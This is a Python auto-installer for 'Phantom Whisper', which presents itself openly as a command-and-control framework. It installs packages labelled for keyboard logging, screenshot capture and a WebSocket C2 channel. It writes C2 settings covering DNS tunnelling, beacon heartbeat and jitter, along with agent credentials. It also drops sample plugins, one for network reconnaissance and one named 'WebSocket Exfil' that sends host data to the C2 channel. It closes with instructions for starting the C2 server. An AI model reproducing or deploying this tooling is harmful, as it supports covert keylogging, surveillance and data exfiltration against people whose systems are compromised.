#!/usr/bin/env python3
"""
Phantom Whisper — Python Installation Manager
═══════════════════════════════════════════════════════════════════════════════
Cross-platform setup, dependency management, and configuration.
Can be run standalone:  python pw_install.py
Or used from pw_install.sh for full automation.
═══════════════════════════════════════════════════════════════════════════════
"""

import json
import os
import platform
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

VERSION = "1.0.0"
PW_DIR = Path.home() / "Phantom-Whisper"
CONFIG_DIR = Path.home() / ".phantom"

CORE_DEPS = ["rich", "requests", "cryptography", "dnspython"]
OPTIONAL_DEPS = {
    "pycryptodome": "XChaCha20 encryption",
    "websockets": "WebSocket C2 channel",
    "pillow": "Image steganography",
    "mss": "Screenshot capture",
    "pynput": "Keyboard logging",
    "aiohttp": "Async HTTP server",
}

# Colors (fallback if rich not installed yet)
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich import box
    console = Console()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    console = None


def cprint(text, color=""):
    """Print with color if possible."""
    if HAS_RICH:
        console.print(text)
    else:
        print(text)


class InstallManager:
    def __init__(self):
        self.os_type = self._detect_os()
        self.python = self._find_python()
        self.errors = 0

    def _detect_os(self) -> str:
        if "com.termux" in os.environ.get("PREFIX", ""):
            return "termux"
        elif sys.platform == "darwin":
            return "macos"
        elif sys.platform == "win32":
            return "windows"
        return "linux"

    def _find_python(self) -> str:
        for cmd in ["python3", "python"]:
            if shutil.which(cmd):
                return cmd
        return "python3"

    def _pip_install(self, pkg: str) -> bool:
        try:
            result = subprocess.run(
                [self.python, "-m", "pip", "install", "--quiet", pkg],
                capture_output=True, text=True, timeout=120
            )
            return result.returncode == 0
        except:
            return False

    def _check_import(self, mod: str) -> bool:
        """Check if a Python module is importable."""
        import_map = {"dnspython": "dns", "pycryptodome": "Cryptodome"}
        import_name = import_map.get(mod, mod)
        try:
            __import__(import_name)
            return True
        except ImportError:
            return False

    def install_system_deps(self) -> bool:
        """Install OS-level dependencies."""
        cprint(f"\n[bold cyan]══ System Dependencies ══[/bold cyan]" if HAS_RICH else "\n=== System Dependencies ===")

        if self.os_type == "termux":
            cmds = [
                ["pkg", "update", "-y"],
                ["pkg", "upgrade", "-y"],
                ["pkg", "install", "-y", "python", "python-pip", "git", "curl", "openssl"],
            ]
        elif self.os_type == "macos":
            if not shutil.which("brew"):
                cprint("[yellow]Homebrew not found. Install from https://brew.sh[/yellow]")
                return False
            cmds = [["brew", "install", "python", "git", "curl", "openssl"]]
        elif self.os_type == "windows":
            cprint("[yellow]Windows detected. Install Python from python.org[/yellow]")
            return True
        else:
            # Linux
            if shutil.which("apt"):
                cmds = [
                    ["apt", "update", "-qq"],
                    ["apt", "install", "-y", "-qq", "python3", "python3-pip", "git", "curl", "openssl", "xclip"],
                ]
            elif shutil.which("yum"):
                cmds = [["yum", "install", "-y", "python3", "python3-pip", "git", "curl", "openssl", "xclip"]]
            elif shutil.which("pacman"):
                cmds = [["pacman", "-S", "--noconfirm", "python", "python-pip", "git", "curl", "openssl", "xclip"]]
            else:
                cprint("[yellow]Unknown package manager. Install deps manually.[/yellow]")
                return True

        for cmd in cmds:
            try:
                # Use sudo on linux if not root
                if self.os_type == "linux" and os.geteuid() != 0 and cmd[0] in ("apt", "yum", "pacman"):
                    cmd = ["sudo"] + cmd
                subprocess.run(cmd, capture_output=True, timeout=300)
            except Exception as e:
                cprint(f"[red]✗ {cmd[0]} error: {e}[/red]")

        cprint("[green]✓ System dependencies configured[/green]")
        return True

    def install_python_deps(self) -> Dict[str, bool]:
        """Install all Python packages. Returns status map."""
        cprint(f"\n[bold cyan]══ Python Dependencies ══[/bold cyan]" if HAS_RICH else "\n=== Python Dependencies ===")

        results = {}
        if HAS_RICH:
            progress_ctx = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                transient=True,
            )
        else:
            progress_ctx = open("/dev/null")

        with progress_ctx as progress:
            if HAS_RICH:
                task = progress.add_task("[cyan]Installing packages...", total=len(CORE_DEPS) + len(OPTIONAL_DEPS))

            # Core deps
            for pkg in CORE_DEPS:
                if self._check_import(pkg):
                    cprint(f"  [green]✓ {pkg}[/green]")
                    results[pkg] = True
                else:
                    ok = self._pip_install(pkg)
                    results[pkg] = ok
                    icon = "[green]✓[/green]" if ok else "[red]✗[/red]"
                    cprint(f"  {icon} {pkg}")
                if HAS_RICH:
                    progress.update(task, advance=1)

            # Optional deps
            for pkg, desc in OPTIONAL_DEPS.items():
                if self._check_import(pkg):
                    cprint(f"  [green]✓ {pkg}[/green]  ({desc})")
                    results[pkg] = True
                else:
                    ok = self._pip_install(pkg)
                    results[pkg] = ok
                    icon = "[green]✓[/green]" if ok else "[dim]✗[/dim] (optional)"
                    cprint(f"  {icon} {pkg}  ({desc})")
                if HAS_RICH:
                    progress.update(task, advance=1)

        return results

    def setup_config(self) -> bool:
        """Create config directory and files."""
        cprint(f"\n[bold cyan]══ Configuration ══[/bold cyan]" if HAS_RICH else "\n=== Configuration ===")

        for d in ["logs", "data", "plugins", "agents"]:
            (CONFIG_DIR / d).mkdir(parents=True, exist_ok=True)
        cprint(f"[dim]Config: {CONFIG_DIR}[/dim]")

        # Generate secret
        secret_file = CONFIG_DIR / ".secret"
        if not secret_file.exists():
            secret = os.urandom(32).hex()
            secret_file.write_text(secret)
            secret_file.chmod(0o600)
            cprint("[green]✓ Encryption secret generated[/green]")

        # Create default config
        config = {
            "version": VERSION,
            "c2": {
                "dns_tunnel_domain": "c2.local",
                "dns_tunnel_port": 5353,
                "http_port": 8080,
                "ws_port": 8081,
                "c2_server_host": "0.0.0.0",
                "heartbeat_interval": 60,
                "jitter": 25
            },
            "encryption": {
                "kdf_iterations": 600000,
                "algorithm": "XChaCha20-Poly1305 + Fernet(AES-128-CBC)"
            },
            "plugins": {"enabled": True, "auto_reload": True},
            "updater": {"auto_update": True, "check_interval_days": 7}
        }
        (CONFIG_DIR / "config.json").write_text(json.dumps(config, indent=2))
        cprint("[green]✓ Default config written[/green]")

        # Env file
        env_path = CONFIG_DIR / "env.sh"
        env_content = f"""# Phantom Whisper Environment
export PW_C2_PASSWORD="{secret_file.read_text().strip()}"
export PW_C2_SALT="{os.urandom(16).hex()}"
export PW_CONFIG_DIR="{CONFIG_DIR}"
export PW_AGENT_ID="{platform.node()[:12] or 'phantom-' + os.urandom(6).hex()}"
"""
        env_path.write_text(env_content)
        env_path.chmod(0o600)
        cprint("[green]✓ Environment configured[/green]")

        return True

    def setup_plugins(self) -> int:
        """Create sample plugins in plugins/ directory."""
        plugins_dir = PW_DIR / "plugins"
        plugins_dir.mkdir(parents=True, exist_ok=True)

        samples = [
            ("hello_world.py", f"""#!/usr/bin/env python3
\"\"\"Sample plugin — system info.\"\"\"
NAME = "Hello World"
VERSION = "1.0"
AUTHOR = "{os.environ.get('USER', 'user')}"
DESCRIPTION = "Demonstrates the plugin system"

def run(app=None):
    import platform
    return {{
        "plugin": NAME,
        "version": VERSION,
        "system": platform.system(),
        "node": platform.node(),
        "message": "Phantom Whisper Plugin System is ALIVE!"
    }}
"""),
            ("recon_extra.py", """#!/usr/bin/env python3
\"\"\"Extended network recon plugin.\"\"\"
NAME = "Extended Recon"
VERSION = "1.0"
AUTHOR = "Phantom Team"
DESCRIPTION = "Additional network recon capabilities"

def run(app=None):
    import subprocess, json
    results = {}
    # DNS info
    try:
        r = subprocess.run(["resolvectl", "status"], capture_output=True, text=True, timeout=5)
        results["dns"] = r.stdout[:200]
    except: pass
    # Routing table
    try:
        r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
        results["default_route"] = r.stdout.strip()
    except: pass
    # Uptime
    try:
        with open("/proc/uptime") as f:
            uptime_secs = float(f.read().split()[0])
            results["uptime_days"] = round(uptime_secs / 86400, 1)
    except: pass
    return results
"""),
            ("exfil_plugin.py", """#!/usr/bin/env python3
\"\"\"Custom exfiltration plugin using WebSocket.\"\"\"
NAME = "WebSocket Exfil"
VERSION = "1.0"
AUTHOR = "Phantom Team"
DESCRIPTION = "Exfiltrate data via WebSocket C2 channel"

def run(app=None):
    if app and hasattr(app, 'ws_channel') and app.ws_channel:
        import json
        data = {
            "type": "plugin_exfil",
            "hostname": __import__('socket').gethostname(),
            "timestamp": __import__('datetime').datetime.now().isoformat(),
            "plugin": NAME
        }
        try:
            app.ws_channel.send_sync(data)
            return {"status": "sent", "data": data}
        except Exception as e:
            return {"error": str(e)}
    return {"status": "no_websocket"}
"""),
        ]

        for fname, content in samples:
            (plugins_dir / fname).write_text(content)

        cprint(f"[green]✓ {len(samples)} sample plugins created[/green]")
        return len(samples)

    def run_diagnostics(self) -> Dict[str, bool]:
        """Full diagnostic check."""
        cprint(f"\n[bold cyan]══ Diagnostics ══[/bold cyan]" if HAS_RICH else "\n=== Diagnostics ===")

        checks = {}

        # Python version
        py_ver = sys.version.split()[0]
        ok = tuple(map(int, py_ver.split(".")[:2])) >= (3, 8)
        checks[f"Python {py_ver}"] = ok
        icon = "[green]✓[/green]" if ok else "[red]✗[/red]"
        cprint(f"  {icon} Python {py_ver}")

        # Core packages
        for pkg in CORE_DEPS:
            ok = self._check_import(pkg)
            checks[pkg] = ok
            icon = "[green]✓[/green]" if ok else "[red]✗[/red]"
            cprint(f"  {icon} {pkg}")

        # Files
        for fname in ["phantom_whisper.py", "c2_server.py", "pw_modules.py"]:
            fpath = PW_DIR / fname
            ok = fpath.exists()
            checks[fname] = ok
            icon = "[green]✓[/green]" if ok else "[red]✗[/red]"
            size = fpath.stat().st_size if ok else 0
            cprint(f"  {icon} {fname} [{size:,} bytes]" if ok else f"  {icon} {fname}")

        # Config
        checks["config"] = (CONFIG_DIR / "config.json").exists()
        icon = "[green]✓[/green]" if checks["config"] else "[red]✗[/red]"
        cprint(f"  {icon} Config directory")

        return checks

    def run_full(self):
        """Run the complete installation."""
        if HAS_RICH:
            from rich.panel import Panel
            console.print(Panel(
                "[bold magenta]Phantom Whisper Auto-Installer[/bold magenta]\n"
                "[cyan]Zero manual steps — complete automation[/cyan]",
                border_style="magenta"
            ))
        else:
            print("=" * 60)
            print("Phantom Whisper Auto-Installer")
            print("=" * 60)

        self.install_system_deps()
        self.install_python_deps()
        self.setup_config()
        self.setup_plugins()
        self.run_diagnostics()

        # Summary
        cprint(f"\n[bold green]╔══════════════════════════════════════════════════════╗[/bold green]")
        cprint(f"[bold green]║        INSTALLATION COMPLETE                         ║[/bold green]")
        cprint(f"[bold green]╚══════════════════════════════════════════════════════╝[/bold green]")

        if HAS_RICH:
            from rich.table import Table
            t = Table(show_header=False, border_style="cyan")
            t.add_column("Action")
            t.add_row("[green]Run framework:[/green]", f"cd {PW_DIR} && python phantom_whisper.py")
            t.add_row("[green]Start C2 server:[/green]", f"cd {PW_DIR} && python c2_server.py 0.0.0.0 8080")
            t.add_row("[green]Web dashboard:[/green]", "http://localhost:8080/api/v1/dashboard")
            t.add_row("[green]Run plugins:[/green]", f"cd {PW_DIR} && python plugins/hello_world.py")
            console.print(t)
        else:
            print(f"\n  Run:  cd {PW_DIR} && python phantom_whisper.py")
            print(f"  C2:   cd {PW_DIR} && python c2_server.py 0.0.0.0 8080")
            print(f"  Web:  http://localhost:8080/api/v1/dashboard")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Phantom Whisper Install Manager")
    parser.add_argument("--full", action="store_true", help="Full installation")
    parser.add_argument("--deps", action="store_true", help="Install Python packages only")
    parser.add_argument("--config", action="store_true", help="Setup config only")
    parser.add_argument("--diagnostics", action="store_true", help="Run diagnostics only")
    args = parser.parse_args()

    mgr = InstallManager()

    if args.deps:
        mgr.install_python_deps()
    elif args.config:
        mgr.setup_config()
    elif args.diagnostics:
        mgr.run_diagnostics()
    else:
        mgr.run_full()


if __name__ == "__main__":
    main()
